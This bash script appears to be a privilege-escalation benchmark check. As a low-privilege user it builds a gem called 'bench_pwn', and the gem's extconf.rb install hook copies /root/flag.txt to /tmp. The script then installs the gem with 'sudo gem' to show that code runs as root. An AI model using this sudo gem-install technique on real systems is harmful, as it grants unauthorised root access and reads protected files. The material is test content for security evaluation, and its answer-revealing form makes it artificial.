#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/gemflag
cd /home/lowpriv/gemproj
rm -rf bench_pwn
mkdir -p bench_pwn/ext bench_pwn/lib
cat > bench_pwn/bench_pwn.gemspec <<'\''EOF'\''
Gem::Specification.new do |s|
  s.name = "bench_pwn"
  s.version = "1.0.0"
  s.summary = "bench"
  s.author = "bench"
  s.files = Dir["{lib,ext}/**/*"]
  s.require_paths = ["lib"]
  s.extensions = ["ext/extconf.rb"]
end
EOF
cat > bench_pwn/lib/bench_pwn.rb <<'\''EOF'\''
module BenchPwn
  VERSION = "1.0.0"
end
EOF
cat > bench_pwn/ext/extconf.rb <<'\''EOF'\''
if File.exist?("/root/flag.txt")
  File.write("/tmp/gemflag", File.read("/root/flag.txt"))
end
create_makefile("bench_pwn")
EOF
cd bench_pwn
sudo /usr/bin/gem build bench_pwn.gemspec >/dev/null 2>&1
sudo /usr/bin/gem install bench_pwn-1.0.0.gem >/dev/null 2>&1
test -r /tmp/gemflag && cat /tmp/gemflag
')"
assert_root_output "${out}"
